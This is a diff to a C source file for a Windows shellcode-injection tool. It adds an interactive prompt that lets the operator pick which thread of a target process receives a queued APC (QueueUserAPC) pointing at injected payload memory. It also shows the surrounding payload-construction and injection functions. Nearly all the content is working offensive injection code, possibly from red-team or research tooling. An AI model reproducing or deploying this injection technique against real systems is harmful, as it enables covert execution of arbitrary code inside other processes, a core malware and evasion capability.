@@ -106,6 +106,19 @@ void construct_payload(LPCSTR shellcode_file, LPCSTR dll_file, long ordinal, PBU
 	pBws->dwDataSize = dwPayloadSize;
 }
 
+char getConsoleChar()
+{
+	char first_ch = NULL;
+	int ch;
+	for (int i = 0; (i < 80) && ((ch = getchar()) != EOF)
+		&& (ch != '\n'); i++)
+	{
+		if (i == 0)
+			first_ch = (char)ch;
+	}
+	return first_ch;
+}
+
 void inject(DWORD pid, BUFFER_WITH_SIZE payload, BOOL useCreateRemoteProcess)
 {
 	HANDLE hProc;
@@ -179,25 +192,28 @@ void inject(DWORD pid, BUFFER_WITH_SIZE payload, BOOL useCreateRemoteProcess)
 				{
 					threadId = threadEntry.th32ThreadID;
 
-					// We inject into all threads, this makes it more likely one will fire the APC
-					// but it may run more than once.
-					// While this is not ideal, it serves for testing.
-
-					printf("Using thread: %i\n", threadId);
-					HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
-					if (hThread == NULL)
+					// Some threads may not trigger the APC in a timely manner, so ask about each thread in turn
+					// so you can keep queuing the APC until you see it fire.
+					printf("Do you want to use thread %i? (y/n): ", threadId);
+					char c = getConsoleChar();
+					if (c == 'y' || c == 'Y')
 					{
-						printf("Error opening thread, will continue to try any other threads...\n");
-					}
-					else
-					{
-						// Queue the APC
-						DWORD dwResult = QueueUserAPC((PAPCFUNC)lpProcMem, hThread, 0);
-						if (!dwResult)
+						printf("Using thread: %i\n", threadId);
+						HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
+						if (hThread == NULL)
 						{
-							printf("Error calling QueueUserAPC on thread, will continue to try any other threads...\n");
+							printf("Error opening thread, will continue to try any other threads...\n");
 						}
-						CloseHandle(hThread);
+						else
+						{
+							// Queue the APC
+							DWORD dwResult = QueueUserAPC((PAPCFUNC)lpProcMem, hThread, 0);
+							if (!dwResult)
+							{
+								printf("Error calling QueueUserAPC on thread, will continue to try any other threads...\n");
+							}
+							CloseHandle(hThread);
+						}
 					}
 				}
 			}
